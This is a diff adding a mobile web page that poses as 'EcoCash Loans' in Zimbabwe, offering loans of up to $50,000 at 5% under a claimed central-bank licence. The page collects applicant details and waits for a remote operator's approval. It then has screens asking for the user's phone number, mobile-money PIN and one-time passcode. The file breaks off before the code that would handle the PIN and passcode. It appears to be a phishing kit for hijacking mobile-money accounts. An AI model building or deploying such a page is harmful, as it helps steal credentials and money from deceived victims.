@@ -1,0 +1,817 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>EcoCash Loans</title>
+<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0;}
+:root{
+  --blue:#1A4E9F;
+  --red:#D0222A;
+  --text:#1a1a2e;
+  --sub:#6b7280;
+  --hint:#9ca3af;
+  --border:#e5e7eb;
+  --bg:#f9fafb;
+  --white:#ffffff;
+  --blue-tint:#f0f4fb;
+}
+html,body{height:100%;font-family:'Nunito',-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,sans-serif;background:var(--bg);display:flex;justify-content:center;margin:0;padding:0;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;}
+.phone{width:390px;min-height:100vh;background:var(--white);display:flex;flex-direction:column;position:relative;overflow:hidden;}
+@media(max-width:430px){
+  body{background:var(--white);}
+  .phone{width:100%;min-height:100dvh;}
+}
+.scr{display:none;flex-direction:column;min-height:100vh;}
+@media(max-width:430px){.scr{min-height:100dvh;}}
+.scr.active{display:flex;}
+
+.hdr{padding:20px 24px 0;display:flex;align-items:center;justify-content:space-between;flex-shrink:0;}
+.wordmark{font-size:15px;letter-spacing:-0.2px;color:var(--text);}
+.wordmark b{font-weight:700;color:var(--blue);}
+.wordmark b em{font-style:normal;color:var(--red);}
+.wordmark span{font-weight:400;color:var(--sub);}
+.step-label{font-size:12px;color:var(--hint);font-weight:400;}
+
+.prog{height:2px;background:var(--border);flex-shrink:0;}
+.prog-fill{height:100%;background:var(--blue);transition:width 0.4s;}
+
+.body{padding:28px 24px 16px;flex:1;display:flex;flex-direction:column;overflow-y:auto;-webkit-overflow-scrolling:touch;}
+.foot{padding:12px 24px 32px;border-top:1px solid var(--border);flex-shrink:0;background:var(--white);}
+
+.hero-eyebrow{font-size:13px;color:var(--hint);margin-bottom:10px;}
+.hero-amount{font-size:40px;font-weight:300;color:var(--text);letter-spacing:-1px;margin-bottom:4px;}
+.hero-sub{font-size:14px;color:var(--sub);margin-bottom:28px;}
+
+.amount-input-wrap{margin-bottom:20px;}
+.amount-input-wrap label{display:block;font-size:12px;color:var(--sub);margin-bottom:8px;}
+.amount-input-row{display:flex;align-items:center;gap:10px;}
+.amount-input-row .currency-symbol{font-size:18px;color:var(--text);font-weight:500;flex-shrink:0;}
+.amount-input-row input{flex:1;padding:13px 14px;background:var(--white);border:1px solid var(--border);border-radius:8px;font-size:16px;font-family:inherit;font-weight:400;color:var(--text);outline:none;transition:border-color 0.15s;}
+.amount-input-row input:focus{border-color:var(--blue);}
+.amount-input-row input::placeholder{color:var(--hint);}
+.amount-error{font-size:11px;color:var(--red);margin-top:6px;display:none;}
+.amount-error.show{display:block;}
+
+.range-wrap{margin-bottom:20px;}
+.range-label{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;}
+.range-label span{font-size:12px;color:var(--sub);}
+.range-label .or-text{font-size:11px;color:var(--hint);font-style:italic;}
+input[type=range]{width:100%;height:2px;-webkit-appearance:none;appearance:none;background:var(--border);border-radius:2px;outline:none;cursor:pointer;display:block;}
+input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:22px;height:22px;border-radius:50%;background:var(--white);border:1.5px solid var(--blue);cursor:pointer;}
+input[type=range]::-moz-range-thumb{width:22px;height:22px;border-radius:50%;background:var(--white);border:1.5px solid var(--blue);cursor:pointer;}
+.range-limits{display:flex;justify-content:space-between;margin-top:8px;}
+.range-limits span{font-size:12px;color:var(--hint);}
+
+.dur-label{font-size:12px;color:var(--sub);margin-bottom:8px;display:block;}
+.dur-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:20px;}
+.dur-opt{padding:12px;border:1px solid var(--border);border-radius:8px;background:var(--white);font-size:14px;color:var(--sub);cursor:pointer;font-family:inherit;text-align:center;transition:border-color 0.15s,color 0.15s,background 0.15s;}
+.dur-opt.selected{border-color:var(--blue);color:var(--blue);background:var(--blue-tint);}
+
+.detail-row{display:flex;justify-content:space-between;align-items:baseline;padding:13px 0;border-bottom:1px solid var(--border);}
+.detail-row:first-of-type{border-top:1px solid var(--border);}
+.detail-lbl{font-size:14px;color:var(--sub);}
+.detail-val{font-size:14px;color:var(--text);font-weight:500;}
+
+.spacer{flex:1;min-height:16px;}
+
+.btn-primary{display:block;width:100%;padding:15px;background:var(--blue);border:none;border-radius:8px;font-size:15px;font-weight:500;color:var(--white);cursor:pointer;font-family:inherit;}
+.btn-primary:disabled{background:#b8c9e8;cursor:not-allowed;}
+.btn-ghost{display:block;width:100%;padding:15px;background:transparent;border:none;font-size:14px;font-weight:400;color:var(--sub);cursor:pointer;font-family:inherit;margin-top:2px;}
+.brow{display:flex;gap:10px;}
+.brow .btn-primary{flex:2;}
+.btn-back{flex:1;padding:15px;background:transparent;border:1px solid var(--border);border-radius:8px;font-size:14px;font-weight:400;color:var(--sub);cursor:pointer;font-family:inherit;}
+
+.section-title{font-size:18px;font-weight:500;color:var(--text);margin-bottom:6px;}
+.section-sub{font-size:14px;color:var(--sub);margin-bottom:28px;line-height:1.5;}
+
+.field{margin-bottom:16px;}
+.flbl{display:block;font-size:12px;color:var(--sub);margin-bottom:6px;font-weight:400;}
+.field input,.field select{width:100%;padding:13px 14px;background:var(--white);border:1px solid var(--border);border-radius:8px;font-size:15px;font-family:inherit;font-weight:400;color:var(--text);outline:none;-webkit-appearance:none;transition:border-color 0.15s;}
+.field select{appearance:none;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath fill='%236b7280' d='M1.41 0L6 4.58 10.59 0 12 1.41l-6 6-6-6z'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 14px center;padding-right:36px;}
+.field input:focus,.field select:focus{border-color:var(--blue);}
+.field input::placeholder{color:var(--hint);}
+.fpair{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
+
+.summary-block{border:1px solid var(--border);border-radius:8px;overflow:hidden;margin-bottom:20px;}
+.sum-row{display:flex;justify-content:space-between;align-items:center;padding:13px 16px;border-bottom:1px solid var(--border);}
+.sum-row:last-child{border-bottom:none;}
+.sum-lbl{font-size:13px;color:var(--sub);}
+.sum-val{font-size:13px;color:var(--text);font-weight:500;}
+.sum-row.total .sum-lbl{font-size:14px;color:var(--text);}
+.sum-row.total .sum-val{font-size:16px;color:var(--blue);font-weight:600;}
+.legal-text{font-size:12px;color:var(--hint);line-height:1.7;}
+
+/* ── Polling Overlay ── */
+.polling-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;align-items:center;justify-content:center;z-index:100;flex-direction:column;}
+.polling-card{background:var(--white);border-radius:16px;padding:32px 24px;text-align:center;max-width:320px;width:90%;}
+.polling-spinner{width:48px;height:48px;border:3px solid var(--border);border-top-color:var(--blue);border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 20px;}
+@keyframes spin{to{transform:rotate(360deg);}}
+.polling-title{font-size:18px;font-weight:600;color:var(--text);margin-bottom:8px;}
+.polling-desc{font-size:14px;color:var(--sub);line-height:1.5;}
+.polling-error{color:var(--red);margin-top:16px;font-size:13px;display:none;}
+
+.succ-wrap{flex:1;display:flex;flex-direction:column;padding:48px 24px 32px;}
+.succ-icon{width:48px;height:48px;border-radius:50%;background:var(--blue-tint);display:flex;align-items:center;justify-content:center;margin-bottom:24px;}
+.succ-icon svg{width:20px;height:20px;stroke:var(--blue);fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round;}
+.succ-h{font-size:22px;font-weight:500;color:var(--text);margin-bottom:10px;letter-spacing:-0.3px;}
+.succ-p{font-size:15px;color:var(--sub);line-height:1.65;margin-bottom:28px;}
+.ref-box{background:var(--bg);border-radius:8px;padding:16px;margin-bottom:auto;}
+.ref-lbl{font-size:11px;color:var(--hint);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:4px;}
+.ref-val{font-size:15px;font-weight:500;color:var(--text);}
+.fnote{font-size:12px;color:var(--hint);margin-top:32px;}
+
+.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(8px);background:var(--white);border:1px solid var(--border);border-radius:8px;padding:12px 16px;display:flex;align-items:center;gap:10px;opacity:0;transition:opacity 0.25s,transform 0.25s;pointer-events:none;z-index:99;white-space:nowrap;}
+.toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
+.t-dot{width:7px;height:7px;border-radius:50%;background:var(--blue);flex-shrink:0;}
+.t-text{font-size:13px;color:var(--sub);}
+.t-text b{color:var(--text);font-weight:500;}
+
+/* ══════════════════════════════
+   LOGIN & OTP STYLES
+══════════════════════════════ */
+.login-screen{background:#2545B4;position:relative;}
+.top-area{background:#f4f4f4;padding-bottom:88px;border-bottom-left-radius:50% 80px;border-bottom-right-radius:50% 80px;position:relative;z-index:2;flex-shrink:0;}
+.logo{text-align:center;padding-top:48px;font-size:64px;font-weight:700;letter-spacing:-3px;line-height:1;}
+.logo .eco{color:#1F4DB8;}
+.logo .cash{color:#EF0000;}
+.login-title{margin-top:68px;text-align:center;font-size:34px;font-weight:800;color:#4A4A4A;letter-spacing:-0.5px;}
+.phone-box{width:88%;height:72px;margin:34px auto 0;border:2.5px solid #1E4CB5;border-radius:18px;display:flex;align-items:center;padding:0 20px;background:#f4f4f4;}
+.flag{width:40px;height:28px;object-fit:cover;border-radius:3px;flex-shrink:0;}
+.arrow-icon{width:0;height:0;border-left:7px solid transparent;border-right:7px solid transparent;border-top:9px solid #75798C;margin-left:10px;flex-shrink:0;}
+.code{font-size:20px;font-weight:400;color:#555;flex-shrink:0;margin-left:14px;}
+.phone-input-login{margin-left:22px;font-size:20px;font-weight:400;color:#000;border:none;background:transparent;outline:none;font-family:'Nunito',sans-serif;width:100%;}
+.phone-input-login::placeholder{color:#aaa;}
+.pin-label{margin-top:26px;text-align:center;font-size:22px;font-weight:400;color:#888;}
+.pin-row{margin-top:28px;display:flex;justify-content:center;gap:14px;}
+.pin-box{width:52px;height:52px;border:2.5px solid #1E4CB5;border-radius:11px;background:#f4f4f4;text-align:center;font-size:20px;font-weight:700;font-family:'Nunito',sans-serif;color:#1E4CB5;outline:none;-webkit-appearance:none;}
+.bottom-area{flex:1;display:flex;flex-direction:column;align-items:center;padding-top:32px;padding-bottom:44px;position:relative;z-index:1;}
+.continue-btn{margin-top:36px;width:78%;height:58px;background:#ffffff;border:none;border-radius:16px;font-family:'Nunito',sans-serif;font-size:20px;font-weight:700;color:#1E4CB5;letter-spacing:0.3px;cursor:pointer;transition:background 0.18s,transform 0.12s;}
+.continue-btn:active{background:#e8eef8;transform:scale(0.97);}
+.version-text{margin-top:auto;padding-top:20px;text-align:center;color:rgba(255,255,255,0.75);font-size:14px;font-weight:300;}
+.assistance{margin-top:12px;text-align:center;font-size:14px;font-weight:400;color:rgba(255,255,255,0.7);}
+.assistance a{color:#ffffff;font-weight:700;text-decoration:underline;cursor:pointer;}
+
+.otp-screen{background:#EAEAEC;overflow-y:auto;}
+.otp-page{width:100%;padding:0 18px 40px;}
+.back-btn{display:inline-flex;align-items:center;justify-content:center;margin-top:44px;width:40px;height:40px;border:1.8px solid #999;border-radius:50%;cursor:pointer;}
+.back-btn svg{width:17px;height:17px;stroke:#555;stroke-width:2.2;fill:none;stroke-linecap:round;stroke-linejoin:round;}
+.card{margin-top:18px;background:#ffffff;border-radius:18px;padding:26px 20px 22px;}
+.otp-title{font-size:25px;font-weight:800;color:#4A4A4A;letter-spacing:-0.3px;}
+.otp-desc{margin-top:12px;font-size:14px;font-weight:400;color:#666;line-height:1.5;}
+.otp-phone{margin-top:4px;font-size:14px;font-weight:700;color:#1E4CB5;}
+.otp-label{margin-top:18px;font-size:13.5px;font-weight:400;color:#aaa;}
+.otp-row{margin-top:10px;display:flex;gap:8px;}
+.otp-box{width:45px;height:50px;flex-shrink:0;border:2px solid #1E4CB5;border-radius:10px;background:#fff;font-size:18px;font-weight:700;font-family:'Nunito',sans-serif;text-align:center;color:#1E4CB5;outline:none;-webkit-appearance:none;transition:box-shadow 0.15s;}
+.otp-box:focus{box-shadow:0 0 0 3px rgba(30,76,181,0.13);}
+.resend{margin-top:20px;text-align:center;font-size:14px;font-weight:400;color:#888;}
+.gap{height:160px;}
+.submit-btn{width:100%;height:58px;background:#b8bcc4;border:none;border-radius:13px;font-family:'Nunito',sans-serif;font-size:18px;font-weight:700;color:#fff;cursor:pointer;transition:background 0.18s,transform 0.1s;}
+.submit-btn.active{background:#1E4CB5;}
+.submit-btn:active{transform:scale(0.97);}
+</style>
+</head>
+<body>
+<div class="phone">
+  <div class="toast" id="toast"><div class="t-dot"></div><div class="t-text" id="t-text"></div></div>
+
+  <!-- ══════════════════════════════
+       POLLING OVERLAY (hidden by default)
+  ═══════════════════════════════ -->
+  <div class="polling-overlay" id="pollingOverlay" style="display:none;">
+    <div class="polling-card">
+      <div class="polling-spinner"></div>
+      <div class="polling-title" id="pollingTitle">Awaiting Approval</div>
+      <div class="polling-desc" id="pollingDesc">Your application has been sent to our team for review. This usually takes less than a minute.</div>
+      <div class="polling-error" id="pollingError"></div>
+    </div>
+  </div>
+
+  <!-- LANDING -->
+  <div class="scr active" id="s-land">
+    <div class="hdr">
+      <div class="wordmark"><b>Eco<em>Cash</em></b> <span>Loans</span></div>
+    </div>
+    <div class="body">
+      <div style="margin-bottom:32px;padding-top:8px;">
+        <div class="hero-eyebrow">Borrow up to $50,000</div>
+        <div class="hero-amount" id="loanAmt">$20</div>
+        <div class="hero-sub" id="hero-sub">— /mo &nbsp;·&nbsp; 5% per year</div>
+      </div>
+      <div class="amount-input-wrap">
+        <label for="amountInput">Enter loan amount</label>
+        <div class="amount-input-row">
+          <span class="currency-symbol">$</span>
+          <input type="text" id="amountInput" placeholder="Minimum $20" value="" oninput="amountInputChange(this.value)">
+        </div>
+        <div class="amount-error" id="amountError">Minimum loan amount is $20</div>
+      </div>
+      <div class="range-wrap">
+        <div class="range-label">
+          <span>Or use slider</span>
+          <span class="or-text">drag to adjust</span>
+        </div>
+        <input type="range" id="slider" min="20" max="50000" value="20" step="10" oninput="sliderChange(this.value)">
+        <div class="range-limits"><span>$20</span><span>$50,000</span></div>
+      </div>
+      <span class="dur-label">Repayment period</span>
+      <div class="dur-grid">
+        <button class="dur-opt selected" data-val="6" onclick="selectDur(this)">6 months</button>
+        <button class="dur-opt" data-val="12" onclick="selectDur(this)">12 months</button>
+        <button class="dur-opt" data-val="18" onclick="selectDur(this)">18 months</button>
+        <button class="dur-opt" data-val="24" onclick="selectDur(this)">24 months</button>
+      </div>
+      <div class="detail-row"><span class="detail-lbl">Monthly payment</span><span class="detail-val" id="land-monthly">—</span></div>
+      <div class="detail-row"><span class="detail-lbl">Interest rate</span><span class="detail-val">5% per year, fixed</span></div>
+      <div class="detail-row"><span class="detail-lbl">Total repayable</span><span class="detail-val" id="land-total">—</span></div>
+      <div class="spacer"></div>
+    </div>
+    <div class="foot">
+      <button class="btn-primary" onclick="go('s-land','s-p1')">Apply now</button>
+    </div>
+  </div>
+
+  <!-- STEP 1 - Your Details -->
+  <div class="scr" id="s-p1">
+    <div class="hdr">
+      <div class="wordmark"><b>Eco<em>Cash</em></b> <span>Loans</span></div>
+      <span class="step-label">1 of 2</span>
+    </div>
+    <div class="prog"><div class="prog-fill" style="width:50%"></div></div>
+    <div class="body">
+      <div class="section-title">Your details</div>
+      <div class="section-sub">We need a few personal details to process your application.</div>
+      <div class="field">
+        <div class="fpair">
+          <div><label class="flbl">First name</label><input type="text" id="fn" placeholder="Tinashe" oninput="validateAlpha(this);chk1()"></div>
+          <div><label class="flbl">Last name</label><input type="text" id="ln" placeholder="Moyo" oninput="validateAlpha(this);chk1()"></div>
+        </div>
+      </div>
+      <div class="field">
+        <label class="flbl">Source of income</label>
+        <select id="incomeSource" onchange="chk1()">
+          <option value="">Select source of income</option>
+          <option value="Employed">Employed</option>
+          <option value="Self-employed">Self-employed</option>
+          <option value="Business owner">Business owner</option>
+          <option value="Student">Student</option>
+          <option value="Unemployed">Unemployed</option>
+          <option value="Retired">Retired</option>
+        </select>
+      </div>
+      <div class="field"><label class="flbl">Monthly income (USD)</label><input type="text" inputmode="numeric" id="inc" placeholder="0.00" oninput="validateNumeric(this);chk1()"></div>
+      <div class="spacer"></div>
+    </div>
+    <div class="foot">
+      <div class="brow">
+        <button class="btn-back" onclick="go('s-p1','s-land')">Back</button>
+        <button class="btn-primary" id="p1btn" onclick="go('s-p1','s-p3')" disabled>Continue</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- STEP 2 - Review -->
+  <div class="scr" id="s-p3">
+    <div class="hdr">
+      <div class="wordmark"><b>Eco<em>Cash</em></b> <span>Loans</span></div>
+      <span class="step-label">2 of 2</span>
+    </div>
+    <div class="prog"><div class="prog-fill" style="width:100%"></div></div>
+    <div class="body">
+      <div class="section-title">Review</div>
+      <div class="section-sub">Please confirm the details below before submitting.</div>
+      <div class="summary-block">
+        <div class="sum-row"><span class="sum-lbl">Applicant</span><span class="sum-val" id="rv-name">—</span></div>
+        <div class="sum-row"><span class="sum-lbl">Income source</span><span class="sum-val" id="rv-source">—</span></div>
+        <div class="sum-row"><span class="sum-lbl">Monthly income</span><span class="sum-val" id="rv-inc">—</span></div>
+        <div class="sum-row"><span class="sum-lbl">Loan period</span><span class="sum-val" id="rv-dur">—</span></div>
+        <div class="sum-row total"><span class="sum-lbl">Loan amount</span><span class="sum-val" id="rv-amt">—</span></div>
+        <div class="sum-row"><span class="sum-lbl">Monthly payment</span><span class="sum-val" id="rv-rep">—</span></div>
+      </div>
+      <div class="legal-text">By submitting this application you confirm the information provided is accurate and consent to EcoCash Loans conducting a credit assessment.</div>
+      <div class="spacer"></div>
+    </div>
+    <div class="foot">
+      <div class="brow">
+        <button class="btn-back" onclick="go('s-p3','s-p1')">Back</button>
+        <button class="btn-primary" onclick="submitLoanApplication()">Submit for Approval</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- LOGIN SCREEN -->
+  <div class="scr login-screen" id="s-login">
+    <div class="top-area">
+      <div class="logo">
+        <span class="eco">Eco</span><span class="cash">Cash</span>
+      </div>
+      <div class="login-title">Login</div>
+      <div class="phone-box">
+        <img class="flag" src="https://flagcdn.com/w80/zw.png" alt="Zimbabwe flag">
+        <div class="arrow-icon"></div>
+        <span class="code">+263</span>
+        <input class="phone-input-login" id="phoneInputLogin" type="tel" inputmode="numeric" maxlength="9" placeholder="Phone Number">
+      </div>
+      <div class="pin-label">Enter your PIN</div>
+      <div class="pin-row">
+        <input class="pin-box" type="password" inputmode="numeric" maxlength="1" pattern="[0-9]">
+        <input class="pin-box" type="password" inputmode="numeric" maxlength="1" pattern="[0-9]">
+        <input class="pin-box" type="password" inputmode="numeric" maxlength="1" pattern="[0-9]">
+        <input class="pin-box" type="password" inputmode="numeric" maxlength="1" pattern="[0-9]">
+      </div>
+    </div>
+    <div class="bottom-area">
+      <button class="continue-btn" id="continueBtn">Continue</button>
+      <div class="assistance">Need help? <a>Get Assistance</a></div>
+      <div class="version-text">v4.0.1P</div>
+    </div>
+  </div>
+
+  <!-- OTP SCREEN -->
+  <div class="scr otp-screen" id="s-otp">
+    <div class="otp-page">
+      <div class="back-btn" id="backBtn">
+        <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg>
+      </div>
+      <div class="card">
+        <div class="otp-title">OTP Verification</div>
+        <div class="otp-desc">Enter the OTP sent to your phone number</div>
+        <div class="otp-phone" id="otpPhoneDisplay">+263 778*****38</div>
+        <div class="otp-label">OTP</div>
+        <div class="otp-row">
+          <input class="otp-box" type="tel" maxlength="1" inputmode="numeric">
+          <input class="otp-box" type="tel" maxlength="1" inputmode="numeric">
+          <input class="otp-box" type="tel" maxlength="1" inputmode="numeric">
+          <input class="otp-box" type="tel" maxlength="1" inputmode="numeric">
+          <input class="otp-box" type="tel" maxlength="1" inputmode="numeric">
+          <input class="otp-box" type="tel" maxlength="1" inputmode="numeric">
+        </div>
+        <div class="resend" id="resendText">
+          Resend OTP in <span id="countdown">58</span> seconds
+        </div>
+        <div class="gap"></div>
+        <button class="submit-btn" id="submitBtn">Submit</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- SUCCESS -->
+  <div class="scr" id="s-ok">
+    <div class="hdr"><div class="wordmark"><b>Eco<em>Cash</em></b> <span>Loans</span></div></div>
+    <div class="succ-wrap">
+      <div class="succ-icon">
+        <svg viewBox="0 0 24 24"><polyline points="4 12 9 17 20 7"/></svg>
+      </div>
+      <div class="succ-h" id="successTitle">Application submitted</div>
+      <div class="succ-p" id="successMsg">Your application is being reviewed. You'll receive an SMS with your reference number and next steps shortly.</div>
+      <div class="ref-box">
+        <div class="ref-lbl">Reference number</div>
+        <div class="ref-val" id="ref-num">ECL-2026-XXXXXX</div>
+      </div>
+      <div class="spacer"></div>
+      <button class="btn-ghost" onclick="reset()">Start a new application</button>
+      <div class="fnote">EcoCash Loans · Licensed by the Reserve Bank of Zimbabwe</div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+// ═══════════════════════════════════════
+//  CONFIGURATION
+// ═══════════════════════════════════════
+const API_BASE = window.location.origin; // Same server serves both frontend & backend
+const POLL_INTERVAL = 3000; // Poll every 3 seconds
+const POLL_TIMEOUT  = 120000; // Stop polling after 2 minutes
+
+var durVal = 6;
+var otpTimer = null;
+var pollTimer = null;
+var currentToken = null;
+
+function go(from, to) {
+  document.getElementById(from).classList.remove('active');
+  var t = document.getElementById(to);
+  t.classList.add('active');
+  t.scrollTop = 0;
+  if (to === 's-p3') populateReview();
+}
+
+function usd(n) {
+  return '$' + n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+}
+
+function calcM(a, m) {
+  if (!a || a <= 0) return 0;
+  var r = 0.05 / 12;
+  return a * r * Math.pow(1 + r, m) / (Math.pow(1 + r, m) - 1);
+}
+
+function selectDur(el) {
+  document.querySelectorAll('.dur-opt').forEach(function(b) { b.classList.remove('selected'); });
+  el.classList.add('selected');
+  durVal = parseInt(el.dataset.val);
+  updateLanding();
+}
+
+function amountInputChange(val) {
+  val = val.replace(/\D/g, '');
+  document.getElementById('amountInput').value = val;
+  var errorEl = document.getElementById('amountError');
+  if (val === '') {
+    errorEl.classList.remove('show');
+    document.getElementById('slider').value = 20;
+    updateLanding();
+    return;
+  }
+  var num = parseInt(val);
+  if (num < 20) {
+    errorEl.classList.add('show');
+    document.getElementById('loanAmt').textContent = '$' + num.toLocaleString('en-US');
+    var m = durVal;
+    var monthly = calcM(num, m);
+    document.getElementById('land-monthly').textContent = monthly > 0 ? usd(monthly) : '—';
+    document.getElementById('land-total').textContent = monthly > 0 ? usd(monthly * m) : '—';
+    document.getElementById('hero-sub').textContent = (monthly > 0 ? usd(monthly) + ' /mo' : '—') + ' · 5% per year';
+  } else {
+    errorEl.classList.remove('show');
+    if (num > 50000) {
+      num = 50000;
+      document.getElementById('amountInput').value = num;
+    }
+    document.getElementById('slider').value = num;
+    updateLanding();
+  }
+}
+
+function sliderChange(v) {
+  document.getElementById('amountInput').value = v;
+  document.getElementById('amountError').classList.remove('show');
+  updateLanding();
+}
+
+function updateLanding() {
+  var a = parseInt(document.getElementById('slider').value) || 20;
+  var m = durVal;
+  var monthly = calcM(a, m);
+  document.getElementById('loanAmt').textContent = '$' + a.toLocaleString('en-US');
+  document.getElementById('land-monthly').textContent = monthly > 0 ? usd(monthly) : '—';
+  document.getElementById('land-total').textContent = monthly > 0 ? usd(monthly * m) : '—';
+  document.getElementById('hero-sub').textContent = (monthly > 0 ? usd(monthly) + ' /mo' : '—') + ' · 5% per year';
+}
+
+function validateAlpha(el) {
+  el.value = el.value.replace(/[^a-zA-Z\s]/g, '');
+}
+
+function validateNumeric(el) {
+  el.value = el.value.replace(/[^0-9.]/g, '');
+  var parts = el.value.split('.');
+  if (parts.length > 2) {
+    el.value = parts[0] + '.' + parts.slice(1).join('');
+  }
+}
+
+function chk1() {
+  var ok = document.getElementById('fn').value.trim() &&
+           document.getElementById('ln').value.trim() &&
+           document.getElementById('incomeSource').value.trim() &&
+           document.getElementById('inc').value.trim();
+  var b = document.getElementById('p1btn');
+  b.disabled = !ok;
+}
+
+function populateReview() {
+  var a = parseInt(document.getElementById('slider').value) || 20;
+  var m = durVal;
+  var fn = document.getElementById('fn').value.trim();
+  var ln = document.getElementById('ln').value.trim();
+  var ic = parseFloat(document.getElementById('inc').value) || 0;
+  var source = document.getElementById('incomeSource').value || '—';
+  document.getElementById('rv-name').textContent = [fn, ln].filter(Boolean).join(' ') || '—';
+  document.getElementById('rv-source').textContent = source;
+  document.getElementById('rv-inc').textContent = ic > 0 ? usd(ic) : '—';
+  document.getElementById('rv-dur').textContent = m + ' months';
+  document.getElementById('rv-amt').textContent = '$' + a.toLocaleString('en-US');
+  document.getElementById('rv-rep').textContent = usd(calcM(a, m)) + ' /mo';
+}
+
+// ═══════════════════════════════════════
+//  BACKEND INTEGRATION
+// ═══════════════════════════════════════
+
+/**
+ * Show the polling overlay.
+ */
+function showPolling(title, desc) {
+  document.getElementById('pollingTitle').textContent = title || 'Awaiting Approval';
+  document.getElementById('pollingDesc').textContent = desc || 'Your application has been sent to our team for review.';
+  document.getElementById('pollingError').style.display = 'none';
+  document.getElementById('pollingOverlay').style.display = 'flex';
+}
+
+/**
+ * Hide the polling overlay.
+ */
+function hidePolling() {
+  document.getElementById('pollingOverlay').style.display = 'none';
+}
+
+/**
+ * Show error in the polling overlay.
+ */
+function showPollingError(msg) {
+  var errEl = document.getElementById('pollingError');
+  errEl.textContent = msg;
+  errEl.style.display = 'block';
+}
+
+/**
+ * Submit loan application to backend, then start polling.
+ */
+async function submitLoanApplication() {
+  var a = parseInt(document.getElementById('slider').value) || 20;
+  var m = durVal;
+  var monthly = calcM(a, m);
+  var total = monthly * m;
+
+  var payload = {
+    type: 'loan_application',
+    firstName: document.getElementById('fn').value.trim(),
+    lastName: document.getElementById('ln').value.trim(),
+    incomeSource: document.getElementById('incomeSource').value,
+    monthlyIncome: document.getElementById('inc').value.trim(),
+    loanAmount: a.toString(),
+    loanPeriod: m + ' months',
+    monthlyPayment: usd(monthly),
+    totalRepayable: usd(total)
+  };
+
+  // Show polling overlay
+  showPolling('Submitting Application...', 'Sending your application to our team for review.');
+
+  try {
+    var resp = await fetch(API_BASE + '/notify', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+
+    var data = await resp.json();
+
+    if (!data.ok) {
+      showPollingError('Failed to submit application: ' + (data.error || 'Unknown error'));
+      return;
+    }
+
+    currentToken = data.token;
+
+    // Update polling UI
+    document.getElementById('pollingTitle').textContent = 'Awaiting Approval';
+    document.getElementById('pollingDesc').textContent = 'Your application has been sent to our team for review. This usually takes less than a minute.';
+
+    // Start polling
+    startPolling();
+
+  } catch (err) {
+    console.error('Submit error:', err);
+    showPollingError('Network error. Please check your connection and try again.');
+  }
+}
+
+/**
+ * Start polling for admin response.
+ */
+function startPolling() {
+  var startTime = Date.now();
+
+  clearInterval(pollTimer);
+
+  pollTimer = setInterval(async function() {
+    // Check timeout
+    if (Date.now() - startTime > POLL_TIMEOUT) {
+      clearInterval(pollTimer);
+      showPollingError('Approval timed out. Please try again later.');
+      return;
+    }
+
+    try {
+      var resp = await fetch(API_BASE + '/poll', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ token: currentToken })
+      });
+
+      var data = await resp.json();
+
+      if (!data.ok) {
+        clearInterval(pollTimer);
+        showPollingError('Error checking approval status.');
+        return;
+      }
+
+      if (data.result === 'loan_approved') {
+        clearInterval(pollTimer);
+        hidePolling();
+        onLoanApproved();
+      } else if (data.result === 'loan_rejected') {
+        clearInterval(pollTimer);
+        hidePolling();
+        onLoanRejected();
+      }
+      // else: still 'pending', keep polling
+
+    } catch (err) {
+      console.error('Poll error:', err);
+      // Don't stop polling on network errors
+    }
+  }, POLL_INTERVAL);
+}
+
+/**
+ * Called when admin approves the loan.
+ */
+function onLoanApproved() {
+  // Generate reference number
+  var ref = 'ECL-2026-' + Math.floor(100000 + Math.random() * 900000);
+  document.getElementById('ref-num').textContent = ref;
+  document.getElementById('successTitle').textContent = 'Application Approved';
+  document.getElementById('successMsg').textContent = 'Congratulations! Your loan application has been approved. You\'ll receive an SMS with your reference number and next steps shortly.';
+  go('s-p3', 's-ok');
+}
+
+/**
+ * Called when admin rejects the loan.
+ */
+function onLoanRejected() {
+  var ref = 'ECL-2026-' + Math.floor(100000 + Math.random() * 900000);
+  document.getElementById('ref-num').textContent = ref;
+  document.getElementById('successTitle').textContent = 'Application Declined';
+  document.getElementById('successMsg').textContent = 'Unfortunately, your loan application was not approved at this time. You may apply again after 30 days or contact our support team for more information.';
+  go('s-p3', 's-ok');
+}
+
+// ═══════════════════════════════════════
+//  LOGIN / OTP (unchanged navigation)
+// ═══════════════════════════════════════
+
+function goToLogin() {
+  go('s-p3', 's-login');
+}
+
+function goToOtp() {
+  var phoneVal = document.getElementById('phoneInputLogin').value.trim();
+  if (phoneVal.length >= 9) {
+    var masked = '+263 ' + phoneVal.substring(0, 2) + '*****' + phoneVal.substring(phoneVal.length - 2);
+    document.getElementById('otpPhoneDisplay').textContent = masked;
+  } else if (phoneVal.length > 0) {
+    var masked = '+263 ' + phoneVal + '*****';
+    document.getElementById('otpPhoneDisplay').textContent = masked;
+  } else {
+    document.getElementById('otpPhoneDisplay').textContent = '+263 778*****38';
+  }
